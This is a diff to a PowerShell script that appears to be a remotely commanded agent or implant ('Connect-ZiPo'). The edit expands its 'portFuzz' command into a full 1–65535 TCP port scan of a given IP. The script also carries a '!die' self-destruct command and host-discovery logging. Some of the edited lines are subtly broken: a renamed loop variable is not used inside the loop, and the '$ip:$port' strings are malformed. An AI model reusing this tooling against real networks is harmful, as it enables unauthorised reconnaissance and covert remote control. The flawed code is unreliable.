@@ -138,7 +138,7 @@ function Connect-ZiPo {
 
         $sw.WriteLine("")
         $sw.WriteLine("Alive hosts:")
-        foreach ($host in $aliveHosts) {
+        foreach ($aliveIP in $aliveHosts) {
             $sw.WriteLine($host)
         }
     }
@@ -149,45 +149,38 @@ function Connect-ZiPo {
 
     
 
-    function Test-Port {
-    param($ip, $port)
-    try {
-        $tcp = New-Object Net.Sockets.TcpClient
-        $tcp.Connect($ip, $port)
-        $tcp.Close()
-        return $true
-    } catch {
-        return $false
-    }
-    } 
-
     function Test-Ports {
     param (
         [string]$ip,
-        [int[]]$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3389,5985),
-        [int]$timeout = 1000
+        [int[]]$ports = @(1..65535),
+        [int]$timeout = 100
     )
 
-    $results = @()
+    Output-Log "[*] Starting port scan on $ip with timeout $timeout ms..."
+    
     foreach ($port in $ports) {
         try {
             $client = New-Object System.Net.Sockets.TcpClient
-            $result = $client.BeginConnect($ip, $port, $null, $null)
-            $connected = $result.AsyncWaitHandle.WaitOne($timeout, $false)
+            $asyncResult = $client.BeginConnect($ip, $port, $null, $null)
+            $connected = $asyncResult.AsyncWaitHandle.WaitOne($timeout, $false)
             $client.Close()
 
             if ($connected) {
-                $results += "[OPEN] ${ip}:${port}"
+                Output-Log "[OPEN] $ip:$port"
             } else {
-                $results += "[CLOSED] ${ip}:${port}"
+                Output-Log "[CLOSED] $ip:$port"
             }
         }
         catch {
-            $results += "[ERROR] ${ip}:${port} $($_.Exception.Message)"
+            Output-Log "[ERROR] $ip:$port $($_.Exception.Message)"
         }
     }
-    return $results -join "`n"
+
+    Output-Log "[*] Port scan completed for $ip."
+    return ""
 }
+
+
 
 
 
@@ -560,20 +553,24 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $args = $cmd.Split(" ")
                         if ($args.Length -eq 2) {
                             $ip = $args[1]
-                            # Вызываем Test-Ports с дефолтным списком портов
-                            $response = Test-Ports -ip $ip
+                            Test-Ports -ip $ip  # сканирует 1..65535
+                            $response = ""
                         }
                         elseif ($args.Length -eq 3) {
                             $ip = $args[1]
                             $port = [int]$args[2]
-                            # Вызываем Test-Ports с заданным портом
-                            $response = Test-Ports -ip $ip -ports @($port)
+                            Test-Ports -ip $ip -ports @($port)
+                            $response = ""
                         }
                         else {
                             $response = "[USAGE] portFuzz <ip> [port]"
                         }
-                        Output-Log $response
+                    
+                        if ($response) {
+                            Output-Log $response
+                        }
                     }
+
 
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
